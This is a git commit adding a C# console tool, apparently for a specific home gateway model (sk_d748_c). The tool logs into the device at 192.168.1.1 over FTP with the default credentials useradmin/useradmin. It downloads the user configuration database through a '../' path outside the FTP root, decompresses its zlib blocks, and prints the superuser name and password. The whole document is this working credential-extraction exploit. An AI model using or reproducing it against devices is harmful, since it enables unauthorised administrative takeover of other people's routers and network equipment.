9f9e12776d783a375f09d81783be6dcfe33c2353
YoumiHa <YoumiHa@outlook.it>
2025-02-05 14:48:39 +0800

    添加项目文件。

---
+++ CRC.cs
@@ -0,0 +1,62 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO.Compression;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace sk_d748_c_superuser_provider
+{
+    public static class CRC
+    {
+        public static byte[] CfgFileDecryCRC(byte[] data)
+{
+    //big endian
+    uint magic = BitConverter.ToUInt32(new byte[] { data[3], data[2], data[1], data[0] }, 0);
+    uint size = BitConverter.ToUInt32(new byte[] { data[11], data[10], data[9], data[8] }, 0);
+    uint compSize = BitConverter.ToUInt32(new byte[] { data[15], data[14], data[13], data[12] }, 0);
+    
+    Console.WriteLine($"cfgFileDecryCRC magic=0x{magic:x} size=0x{size:x} comp_size=0x{compSize:x}");
+
+    int offset = 60;  //offset
+    using (MemoryStream buffer = new MemoryStream())
+    {
+        while (true)
+        {
+            //every 12 bytes are header
+            byte[] blockHeader = new byte[12];
+            Array.Copy(data, offset, blockHeader, 0, 12);
+            //parse data
+            uint blockSize = BitConverter.ToUInt32(new byte[] { 
+                blockHeader[3], blockHeader[2], blockHeader[1], blockHeader[0] }, 0);
+            uint compressedSize = BitConverter.ToUInt32(new byte[] { 
+                blockHeader[7], blockHeader[6], blockHeader[5], blockHeader[4] }, 0);
+            uint nextOffset = BitConverter.ToUInt32(new byte[] { 
+                blockHeader[11], blockHeader[10], blockHeader[9], blockHeader[8] }, 0);
+
+            //get data chunk
+            byte[] compressedBlock = new byte[compressedSize];
+            Array.Copy(data, offset + 12, compressedBlock, 0, compressedSize);
+
+            //decompress data
+            using (MemoryStream compressedStream = new MemoryStream(compressedBlock))
+            using (MemoryStream decompressedStream = new MemoryStream())
+            {
+                using (ZLibStream decompressionStream = new ZLibStream(compressedStream, CompressionMode.Decompress))
+                {
+                    decompressionStream.CopyTo(decompressedStream);
+                }
+                buffer.Write(decompressedStream.ToArray(), 0, (int)blockSize);
+            }
+
+            //Check data chunk
+            if (nextOffset == 0)
+            {
+                return buffer.ToArray();
+            }
+            offset = (int)nextOffset;
+        }
+    }
+}
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,48 @@
+﻿using System.Text;
+using System.Text.RegularExpressions;
+using System.Xml;
+using FluentFTP;
+
+namespace sk_d748_c_superuser_provider
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("init ftp client to 192.168.1.1");
+            var ftpClient = new FtpClient("ftp://192.168.1.1","useradmin","useradmin",21);
+            try
+            {
+                Console.WriteLine("try get user data");
+                ftpClient.Connect();
+                ftpClient.DownloadBytes(out byte[] OutBytes,"../userconfig/cfg/db_user_cfg.xml");
+                var decryCrc = CRC.CfgFileDecryCRC(OutBytes);
+                string user_data = Encoding.UTF8.GetString(decryCrc);
+                var superUser = getSuperUser(user_data);
+                Console.WriteLine($"username: {superUser[0]}");
+                Console.WriteLine($"passwd: {superUser[1]}");
+                Console.ReadKey();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+                Console.WriteLine("getting files failed");
+                Console.WriteLine("Press any key to continue...");
+                Console.ReadKey();
+            }
+        }
+
+        static string[] getSuperUser(string data)
+        {
+            int root_len = data.IndexOf("name=\"DevAuthInfo\"");
+            string sub1_data = data.Substring(root_len, data.IndexOf("</Row>", root_len)-root_len);
+            var username_len = sub1_data.IndexOf("name=\"User\"");
+            string username_data = sub1_data.Substring(sub1_data.LastIndexOf("<", username_len),sub1_data.IndexOf(">",username_len)-sub1_data.LastIndexOf("<", username_len)+1);
+            var pass_len = sub1_data.IndexOf("name=\"Pass\"");
+            string pass_data = sub1_data.Substring(sub1_data.LastIndexOf("<", pass_len),sub1_data.IndexOf(">",pass_len)-sub1_data.LastIndexOf("<",pass_len)+1);
+            var pass = Regex.Match(pass_data,"(?<=val=\")[^\"]*(?=\")").Value;
+            var username = Regex.Match(username_data, "(?<=val=\")[^\"]*(?=\")").Value;
+            return new string[2] { username, pass };
+        }
+    }
+}
